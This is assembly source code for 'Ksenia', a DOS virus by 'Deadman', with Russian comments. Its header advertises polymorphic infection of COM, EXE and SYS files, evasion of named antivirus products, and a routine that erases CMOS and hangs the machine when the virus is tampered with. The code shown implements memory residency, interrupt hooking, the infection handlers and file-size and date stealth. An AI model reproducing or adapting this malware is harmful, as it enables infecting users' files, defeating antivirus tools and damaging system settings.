 comment ъ

                KSENIA Virus Version 1.1 Copyright (C) Deadman
              └────────────────────────────────────────────────┘

 TSR/COM/EXE/SYS fast polymorphic infector
  Infects on 1857h/3Dh/41h/43h/4Bh/56h/6Ch/7141h/7143h/7156h/716Ch/71A9h
     (Internal/Open/Del/Chmod/Exec/Ren/ExtOpen/LFNs/LFN Server Open)
  Size/Date stealth on 11h/12h/4Eh/4Fh/5700h/5701h/714Eh/714Fh/71A6h
     (Find First/Next FCB/DTA/LFN + Get/Set File Time/Date + Get Handle Info)
  Redirection stealth on 3Fh/42h (Read/LSeek)
  SFT stealth without using any SFT values (for Novell/Win95 compatibility)
  Disinfects the host on 40h (Write)
  Re-Hooks Int 21h vector after Win95 installation. Works perfectly!
  Re-Hooks Int 21h vector if virus handler has been removed from the chain
  Uses the most safe method of infecting .SYS files for resident virus
  Every second it calcucates CRC32 and erases CMOS if the CRC is incorrect
  Virus stays resident in low memory, executing the host with 4B00h function
  When some of AVs are executing, virus adds some parameters to cmdline
  Polymorphic in files uses its internal polymorphic engine
  Engine uses table-based instructions as a random size garbage (85% of 8086)
  Engine uses different count and index registers
  Generates different decryptors (ADD/SUB/XOR/NOT/NEG/ROR/ROL/INC/DEC imm8)
  Has a second internal shield (secondary encrypts itself with a kewl method)
  Will not infect files with a current hour stamp
  Will not infect ADINF/COMMAND files
  Disable stealth if PkZip/RAR/ARJ/LHA/ARC/DEFRAG/SPEEDISK/CHKDSK/ScanDisk/NDD/ADINF are running
  Intercepts Int 24h to disallow user be warned by a critial error message
  Virus was analysed by these AVs
      F-PROT 3.05b - No detection or warns
      AVP 3.0.Plat - No detection or warns
      DRWEB 4.11   - No detection or warns

                                 Deadman from hell. E-Mail: dman@mail.ru ъ

 vsize  equ     eov-ksenia      ; дисковая память для вируса
 msize  equ     eom-ksenia      ; размер памяти требуемой вирусу
 v_id   equ     0b52dh          ; метка вируса (HEADER+12h)
 crlen  equ     100h            ; размер полиморфного расшифровщика

 b      equ     <byte ptr>      ; некоторые сокращения
 w      equ     <word ptr>
 d      equ     <dword ptr>
 o      equ     <offset>

 mvs    macro   Dest,Sour       ; макрос для пересылки данных
        push    Sour            ; через стек
        pop     Dest
        endm

        model   tiny            ; ШАПКА
        codeseg
        p386
        org     100h
 ksenia:
        xor     bp,bp           ; нужно для 1-го запуска вируса
        call    crc             ; подсчет CRC вируса
        mov     checksum,eax
        call    SaveRegs        ; сохранение входных регистров
        jmp     shield          ; эти CRLEN байт зарезервированы в теле
        org     ksenia+crlen    ; вируса для полиморфного дешифратора

        push    3202h           ; восстановление флагов
        popf
        call    SaveRegs        ; сохранение входных регистров

        mov     ah,30h          ; запрос версии DOS
        int     21h             ; применяется для вычисления
 ip:    mov     bp,sp           ; экстра смещения в зараженном файле
        mov     bp,[bp-6]       ; сохраненное IP командой INT и
        sub     bp,offset ip    ; вычисляем разность смещений (delta)

        push    ds              ; этот кусок кода не даст эмулятору
        mvs     ds,0ffffh       ; расшифровать вирус
        mov     si,07h          ; FFFF:0005 содержит дату, из которой мы
        mov     dx,2eh          ; хватаем символ "/", и с помощью XOR
        xor     dl,[si]         ; получаем единицу
        pop     ds

        lea     si,endi-1+bp    ; второе (внутреннее) кольцо защиты вируса
        mov     cx,endi-shield-1
 turbo: mov     al,cs:[si]      ; краткая структура:
        add     cs:[si-1],al    ; ДО:    byte1 byte2 byte3 byte4
        sub     si,dx           ; ПОСЛЕ: b1+b2 b2+b3 b3+b4 b4+b5
        loop    turbo
 shield:
        cmp     cs:host+bp,"S"  ; проверка хоста на системный
        jz      strategy        ; драйвер

        mov     ax,1856h        ; проверка на присутствие вируса в памяти
        int     21h             ; AH=18 - пустая функция
        cmp     ax,3265h        ; AX=3265 - значит, что копия вируса уже в
        jne     exeinstall      ; памяти

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Возвращение управления программе
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 complete:
        lea     si,original+bp  ; si-сохраненное начало хоста
        mov     al,cs:host+bp   ; загрузка кода типа хоста
        cmp     al,"S"          ; системный драйвер?
        jz      run_sys
        cmp     al,"E"          ; исполняемый файл?
        jz      run_exe

        mov     di,100h         ; тип зараженной программы: COM
        push    di              ; сохранение в стеке адреса возврата
        mov     cx,32           ; восстановление в памяти оригинального
        rep     movsb           ; заголовка программы
        jmp     LoadRegs        ; передача управления в начало программы

 run_sys:
        mov     ax,cs:[si+12h]  ; восстановление метки вируса
        mov     cs:[12h],ax     ; восстановление смещения процедуры
        mov     ax,cs:[si+06h]  ; обработки стратегии
        mov     cs:[06h],ax     ;
        push    ax              ; сохранение смещения в стеке
        jmp     LoadRegs        ; восстановление регистров

 run_exe:
        mov     ax,es
        add     ax,010h
        add     cs:[si+16h],ax  ; .reloc
        add     cs:[si+0eh],ax  ; .reloc
        mov     bp,sp
        mov     [bp.rbx],si     ; сохранение указателя на заголовок
        call    LoadRegs        ; восстановление регистров
        mov     ss,cs:[bx+0eh]  ; установка стекового сегмента
        mov     sp,cs:[bx+10h]  ; установка указателя стека
        jmp     d cs:[bx+14h]   ; передача управления

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Инсталляция вируса в память из командного файла
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 exeinstall:
        mov     di,100h         ; ES:DI = PSP:0100
        mvs     ds,cs           ; DS:SI = код вируса
        lea     si,ksenia+bp    ; копируем код вируса поверх зараженной
        mov     cx,msize        ; программы сразу после PSP
        db      6ah,00h         ; загружаем в стек команды для
        db      66h,68h         ; копирования вируса
        db      0f3h,0a4h,0cah,6
        push    es offset done  ; rep movsb / retn 06
        mov     ax,sp
        add     ax,4
        jmp     far ptr ax

 done:  mov     ax,cs           ; мы на новом месте, с правильным
        mov     ds,ax           ; смещением, как при компиляции
        mov     seg0,ax         ; заполнение сегментных полей в EPB
        mov     seg1,ax
        mov     seg2,ax

        call    VectMan         ; загрузка и перехват векторов прерываний
        call    FixVirus        ; заражение некоторых важных файлов

        mov     ah,4ah          ; уменьшить до нужного размера блок
        mov     bx,(msize+100h)/16+2 ; памяти, выделенный программе
        mvs     es,cs
        int     21h

        mov     si,2ch          ; PSP:2Ch = сегмент окружения
        mov     ds,[si]         ; поместить его в DS
        xor     ax,ax
        mov     si,-1

 escan: inc     si              ; сканним пока не найдем DW 0
        cmp     W [si],ax       ; за ним следует имя файла (программы),
        jne     escan           ; из которой был запушен вирус
        lea     dx,[si+4]       ; dx -> имя

        mov     ax,cs           ; проинициализируем стековые указатели
        mov     ss,ax           ; а то они болтаются где-то внизу //
        lea     sp,stacks+size stacks

        mov     ax,4b00h        ; запускаем носителя
        lea     bx,epb          ; ES:BX = EPB
        int     21h

        mov     si,2ch
        mov     es,cs:[si]      ; получение сегмента окружения
        mov     ah,49h          ; освобождение блока памяти
        int     21h

        mov     ax,cs           ; маскируем наш блок памяти так, как будто
        dec     ax              ; он содержит только наш PSP. А под себя
        mov     ds,ax           ; построим другой блок памяти, следующий
        xor     si,si           ; прямо за PSP. При завершении программы
        mov     al,4dh          ; наш блок памяти не будет освобожен.
        xchg    B [si],al
        mov     W [si+3],0fh    ; Память под MCB нам любезно предоставлена
        mov     B [si+100h],al  ; командной строкой (PSP+0F0h)
        mov     W [si+101h],8   ;
        mov     W [si+103h],msize/16+2

        mov     ah,4dh          ; AH=4Dh (WAIT)
        int     21h             ; получить ErrorLevel запущенной программы
        mov     ah,4ch          ; AH=4Ch (EXIT)
        int     21h             ; выйти в DOS без всяких подозрений

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Инсталляция вируса в память из .SYS файла
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 Strategy:
        mvs     ds,cs           ; инициализация сегментного регистра
        mov     si,sp           ; загрузка указателей на блок
        mov     bx,ss:[si.rbx]  ; запроса из стека
        mov     es,ss:[si.res]  ;
        lea     si,reqhdr+bp
        mov     [si],bx         ; сохранение указателей в ячейках
        mov     [si+2],es       ; памяти в теле вируса
        jmp     complete        ; передача управления драйверу

 Interrupt:
        call    SaveRegs        ; сохранение регистров

        mov     ah,30h          ; запрос версии DOS
        int     21h             ; применяется для вычисления
 ipX:   mov     bp,sp           ; экстра смещения в зараженном файле
        mov     bp,[bp-6]       ; сохраненное IP командой INT и
        sub     bp,offset ipX   ; вычисляем разность смещений (delta)

        mvs     ds,cs           ; инициализация DS
        lea     si,original+bp  ; указатель на оригинальное
        lea     di,intcall+bp   ; начало драйвера
        mov     ax,[si+08]      ; загрузка смещения процедуры
        mov     ds:[08],ax      ; прерывания сохранение смещения
        mov     [di],ax         ; ячейка с адресом процедуры прерывания
        mov     [di+02],cs      ; драйвера

        lea     bx,reqhdr+bp    ; указателя на адрес заголовка запроса
        les     bx,[bx]         ; загрузка адреса заголовка запроса
        mov     ax,es:[bx.0eh]  ; смещение конца памяти, доступной драйверу
        shr     ax,4            ; получение сегментной состовляющей смещения
        add     ax,es:[bx.10h]  ; добавление сегмента конца памяти
        sub     ax,msize/10h+2  ; уменьшение доступной драйверу памяти
        mov     w es:[bx.0eh],0 ; смещение последего доступного байта
        mov     es:[bx.10h],ax  ; сегмент последего доступного байта
        sub     ax,10h          ; AX - сегмент вируса
        mov     es,ax           ; сохранение сегмента
        mov     di,100h         ; перегон вируса в кусок
        lea     si,[di+bp]      ; откушенной у драйвера памяти
        mov     cx,msize
        cld
        rep     movsb

        push    es o tmps       ; передача управления в новый сегмент
        retf
 tmps:  call    LoadRegs        ; восстановление регистров

        call    d cs:intcall    ; вызов драйвера (функция 00: инициализация)

        call    SaveRegs        ; сохранение регистров
        mov     ax,1856h        ; проверка на присутствие вируса в памяти
        int     21h             ; AH=18 - пустая функция
        cmp     ax,3265h        ; AX=3265 - значит, что копия вируса уже в
        jz      sfars           ; памяти

        mvs     ds,cs           ; инициализация сегментного регистра
        les     bx,d reqhdr     ; буфер запроса
        mov     ax,es:[bx.0eh]  ; смещение конца памяти, доступной драйверу
        shr     ax,4            ; получение сегментной состовляющей смещения
        add     ax,es:[bx.10h]  ; добавление сегмента конца памяти
        cmp     ax,intcall+2    ; сегмент драйвера
        jz      sfars           ; нерезидентный драйвер?

        inc     ax              ; + 1 параграф
        push    ax              ; граница
        add     ax,msize/10h+2  ; увеличение границ памяти
        mov     w es:[bx.0eh],0 ; смещение последего доступного байта
        mov     es:[bx.10h],ax  ; сегмент последего доступного байта
        pop     ax              ; уже не граница

        sub     ax,10h          ; AX - сегмент вируса
        mov     es,ax           ; сохранение сегмента
        mov     di,100h
        mov     si,di
        mov     cx,msize        ; копирование тела вируса из
        cld                     ; временного сегмента в окончательный
        rep     movsb

        push    es offset owns  ; передача управления в окончательный
        retf                    ; сегмент вируса после драйвера
 owns:  call    VectMan         ; загрузка и перехват векторов прерываний

 sfars: call    LoadRegs        ; загрузка регистров
        retf

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Область данных
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒

 copyright    db      'Ksenia.'
              db      vsize/1000 mod 10+'0'
              db      vsize/100  mod 10+'0'
              db      vsize/10   mod 10+'0'
              db      vsize      mod 10+'0'
              db      ' Version 1.1 Copyright (C) ',??date,' by Deadman',0

 extens       db      '.com',0  ; расширения файлов, которые мы
              db      '.exe',0  ; инфицируем
              db      '.sys',0
              db      0

 prms         db      'AVPDOS32',0,0,' /M'    ,0dh
              db      'DRWEB'   ,0,0,' /NM'   ,0dh
              db      'F-PROT'  ,0,0,' /NOMEM',0dh
              db      0

 AVs          db      'ADINF',0   ; их вирус трогать не будет
              db      'COMMAND',0
              db      0

 windows      db      'WiNBooTDiR=',0
              db      0

 files        db      '\SYSTEM\CONAGENT.EXE',0
              db      '\COMMAND\MODE.COM',0
              db      '\COMMAND\ANSI.SYS',0
              db      '\HIMEM.SYS',0
              db      '\WIN.COM',0
              db      0

 stlock       db      'PKZIP',0 ; программы, во время работы которых
              db      'RAR',0   ; отключаются стелс-функции вируса
              db      'ARJ',0
              db      'LHA',0
              db      'ARC',0
              db      'UUENCODE',0
              db      'DEFRAG',0
              db      'SPEEDISK',0
              db      'SCANDISK',0
              db      'CHKDSK',0
              db      'NDD',0
              db      'ADINF',0
              db      0

 funcs        dw      1856h,tsrtest     ; проверка зараженности памяти (NULL)
              dw      4AFFh,rehook      ; re-перехват вектора (SETBLOCK)

              dw      3DFFh,infect      ; заражение (OPEN)
              dw      1857h,infect      ; заражение (VIXFIRUS)
              dw      41FFh,infect      ; заражение (DEL)
              dw      43FFh,infect      ; заражение (CHMOD)
              dw      4BFFh,infect      ; заражение (EXEC)
              dw      56FFh,infect      ; заражение (REN)
              dw      6C00h,extinfect   ; заражение (EXTOPEN)
              dw      7141h,infect      ; заражение (LFN DEL)
              dw      7143h,infect      ; заражение (LFN CHMOD)
              dw      7156h,infect      ; заражение (LFN REN)
              dw      716Ch,extinfect   ; заражение (LFN OPEN)
              dw      71A9h,extinfect   ; заражение (LFN SERVER OPEN)

              dw      11FFh,fcbstealth  ; стелс (FCB)
              dw      12FFh,fcbstealth  ; стелс (FCB)
              dw      4EFFh,dtastealth  ; стелс (DTA)
              dw      4FFFh,dtastealth  ; стелс (DTA)
              dw      714Eh,lfnstealth  ; стелс (LFN)
              dw      714Fh,lfnstealth  ; стелс (LFN)
              dw      71A6h,infstealth  ; стелс (LFN HANDLE INFO)
              dw      5700h,date_get    ; стелс (GET DATE)
              dw      5701h,date_set    ; стелс (SET DATE)
              dw      42FFh,seekstealth ; стелс (LSEEK)
              dw      3FFFh,readstealth ; стелс (READ)
              dw      40FFh,diswrite    ; стелс (WRITE)

              dw      3EFFh,patchsft    ; корректировка SFT
              dw      44FFh,patchsft    ; корректировка SFT
              dw      45FFh,patchsft    ; корректировка SFT
              dw      46FFh,patchsft    ; корректировка SFT
              dw      68FFh,patchsft    ; корректировка SFT
              dw      0


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Обработчик прерывания 08 (Virus Guard)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 vguard:
        call    SaveRegs        ; сохранение регистров
        inc     cs:delay        ; проверка будет происходить примерно
        cmp     cs:delay,18     ; каждую секунду
        jb      exit_guard
        mov     cs:delay,0
        call    crc             ; подсчет CRC теля вируса
        cmp     cs:checksum,eax ; сравнение ее с эталонной
        jz      crc_ok

        mov     ax,1681h        ; объявление начала DOS Critical Session
        int     2fh             ;
        mov     al,0ffh         ; контроллер прерываний:
        out     21h,al          ; запрещение всех аппаратных прерываний

        mov     cx,40h          ; затираем данные CMOS
 cmos:  mov     ax,cx
        out     71h,al
        out     70h,al
        loop    cmos
        jmp     $               ; весим машину

 crc_ok:
        mov     ax,1856h        ; проверяем, никто ли не выкидывал наш
        int     21h             ; обработчик 21-го прерывания из общей
        cmp     ax,3265h        ; цепи?
        je      exit_guard

        mov     ax,3521h        ; запрос вектора int 21h
        int     21h
        call    set_dup         ; установить 21-й вектор прерывания на другой
        lea     dx,manager      ; здесь нужно переустановить вектор
        call    chk_dup         ; находим место, куда указывал вектор
        jnz     reset           ; в последние годы своей жизни
        lea     dx,handler
 reset: mov     ax,2521h        ; переустанавливаем вектор
        mvs     ds,cs
        int     21h

 exit_guard:
        call    LoadRegs
        jmp     d cs:io08

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Обработчик прерывания 21
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 handler:
        call    chk_dup         ; проверка, не переустановили ли вектор
        jz      manager         ; это бывает после загрузки Win95
        jmp     D cs:io21p      ; иначе мы тут ни при чем

 manager:
        call    SaveRegs        ; сохранить все регистры

        mov     cs:save_ax,ax   ; соохранение параметров
        mov     cs:save_bx,bx   ; будут использоваться (Filename), если
        mov     cs:save_es,es   ; функция = 4b00 и заппускаемый файл - AV

        lea     si,funcs        ; есть табличка, по которой обрабатываются
 fscan: cmp     ah,cs:[si+1]    ; нужные функции int 21 (dw F#, dw offset)
        jne     lnext           ; сравниваем al с текущей ячейкой таблицы
        cmp     B cs:[si],0ffh  ; проверка на ненужность проверки подфункции
        je      ljump
        cmp     B cs:[si],al    ; проверка подфункции
        jne     lnext

 ljump: call    mcbcheck        ; функция найдена: проверка MCB (для stealth)
        push    W cs:[si+2]     ; берем смещение обработчика для функции
        jmp     LoadRegs        ; восстанавливаем регистры

 lnext: add     si,4            ; берем следующую запись из таблицы
        cmp     w cs:[si],0     ; проверка конца таблицы
        jnz     fscan
        call    LoadRegs        ; обработчик для этой функции так и не
        jmp     ExitHandler     ; найден: отдаем управление

 exithandler:
        push    ax ax es bx bp  ; сохранение ES:BX и резервирование места
        call    get_dup         ; получение оригинального вектора int 21h
        mov     bp,sp
        mov     [bp+6],bx       ; занос вектора в две свободные ячейки
        mov     [bp+8],es       ; в стеке
        pop     bp bx es        ; восстановление регистров ES:BX
        retf                    ; передача управления DOS

 ireturn:
        retf    2               ; возврат с уничтожением флагов в стеке

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Заражение файлов
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 extinfect:
        call    SaveRegs        ; сохранить в стеке регистры
        mov     dx,si
        jmp     InfA
 infect:
        call    SaveRegs        ; сохранить в стеке регистры
 InfA:  call    Hook24          ; установка 24-го вектора прерывания
        call    Filename        ; проверка имени и расширения файла
        jc      noinf
        call    ClearFileAttributesA
        jc      noinf
        call    CreateFileA     ; открытие файла для R/W
        jc      RAttr
        call    Infect_Handle   ; инфицирование handle
        call    CloseFile       ; закрытие файла
 Rattr: call    RestoreFileAttributesA
 Noinf: call    Remove24        ; восстановление обработчика int 24h
        call    LoadRegs        ; восстановление регистров

        cmp     ah,3dh          ; проверка на функцию открытия файла
        je      sftstealth      ; в случае открытия инфицированного файла
        cmp     ax,6c00h        ; нам понадобится уменьшить его длину
        je      sftstealth      ; в SFT и откорректировать его дату
        cmp     ax,716ch        ;
        je      sftstealth      ;
        cmp     ax,71A9h        ;
        je      sftstealth      ;
        jmp     exithandler     ;

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; SFT stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 sftstealth:
        call    int21           ; открыть нужный файл
        call    SaveRegs        ; сохранение регистров
        jc      no_sft
        xchg    ax,bx
        call    CloseSFT        ; закрыть SFT
 no_sft:
        call    LoadRegs
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; FCB stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 fcbstealth:
        call    int21           ; вызвать функцию DOS
        call    SaveRegs        ; сохранение регистров
        cmp     al,0ffh         ; найдено что-нибудь?
        jz      no_fcb
        cmp     cs:stf,0        ; работать можно?
        jnz     no_fcb

        mov     ah,2fh          ; запрос адреса DTA
        call    int21
        cmp     b es:[bx],0ffh  ; расширенное FCB?
        jne     usual
        add     bx,7
 usual: lea     si,[bx+19h]     ; si -> дата файла
        lea     di,[bx+1dh]     ; di -> длина файла
        call    sizst           ; скрытие лишних байт
 no_fcb:
        call    LoadRegs        ; восстановление регистров
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; DTA stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 dtastealth:
        call    int21           ; вызвать функцию DOS
        call    SaveRegs        ; сохранение регистров
        jc      no_dta          ; нашли?
        cmp     cs:stf,0        ; работать можно?
        jnz     no_dta

        mov     ah,2fh          ; запрос адреса DTA
        call    int21
        lea     si,[bx+18h]     ; si -> дата файла
        lea     di,[bx+1ah]     ; di -> длина файла
        call    sizst           ; скрытие лишних байт
 no_dta:
        call    LoadRegs        ; восстановление регистров
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Win95 stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 infstealth:
        stc                     ; CF должен быть установлен
        call    int21           ; вызвать функцию DOS
        call    SaveRegs        ; сохранение регистров
        jc      no_win          ; все ok?
        cmp     cs:stf,0        ; работать можно?
        jnz     no_win
        mov     ax,0            ; время в Win95 формате
        mov     si,dx
        lea     di,[si+24h]     ; размер файла
        lea     si,[si+14h]     ; дата файла
        mvs     es,ds
        jmp     allw95

 lfnstealth:
        call    int21           ; вызвать функцию DOS
        call    SaveRegs        ; сохранение регистров
        jc      no_win          ; нашли?
        cmp     cs:stf,0        ; работать можно?
        jnz     no_win
        mov     ax,si           ; формат времени
        lea     si,[di+14h]     ; дата файла
        lea     di,[di+20h]     ; размер файла

 allw95:
        cmp     ax,1            ; проверка формата времени
        jz      dos_date

        push    si di ax        ; сохранение параметров на будующее
        mov     ax,71a7h        ; перевод времени из формата
        mov     bl,0            ; Win95 в формат DOS
        mvs     ds,es           ; SI указывает на дату
        call    int21           ; сейчас CX:DX содержат обычное DOS время
        pop     ax di si        ; восстановление параметров
        mov     [si],cx         ; сохранение параметров в FindDataRecord
        mov     [si+2],dx

 dos_date:
        add     si,2            ; si -> дата файла
        call    sizst           ; di -> длина файла
        sub     si,2

        cmp     ax,1            ; проверка формата времени
        jz      no_win

        mov     ax,71a7h        ; перевод времени из формата
        mov     bl,1            ; DOS в формат Win95
        mov     di,si           ; DI -> buffer для времени и даты
        mov     cx,[di]         ; чтение времени и даты в формате DOS
        mov     dx,[di+2]
        call    int21           ; сейчас ES:[DI] содержит время Win95

 no_win:
        call    LoadRegs        ; восстановление регистров
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; DATE stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 date_get:
        call    OpenSFT         ; открыть SFT
        cmp     cs:stf,0        ; работать можно?
        jnz     no_seek
        call    int21           ; запрос даты
        call    hidestm         ; маскировка даты
        clc
        jmp     seek_ret

 date_set:
        call    OpenSFT         ; открыть SFT
        call    int21           ; установка даты
        call    correctdate     ; правка даты
        jmp     seek_ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; LSEEK stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 seekstealth:
        call    OpenSFT         ; открыть SFT
        cmp     cs:stf,0        ; работать можно?
        jnz     no_seek
        call    ioctl           ; проверка файла IOCTL
        jc      no_seek
        call    Inf_Check       ; инфицирован?
        jnc     no_seek

        push    cx              ; сохранение CX
        cmp     al,2            ; проверка типа
        jne     forw
        sub     dx,vsize        ; маскировка настоящего конца файла
        sbb     cx,0            ; сдвиг идет от головы вируса
 forw:  call    int21           ; здесь установка указателя идет от начала
        pop     cx              ; восстановление CX
        jc      seek_ret        ; или от текущей позиции
        call    seekhide        ; блокировка попадания lseek на тело вируса
        mov     ax,cs:seek_pos
        mov     dx,cs:seek_pos+2
        jmp     seek_ret

 no_seek:
        call    int21           ; вызов DOS
 seek_ret:
        call    CloseSFT        ; закрыть SFT
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
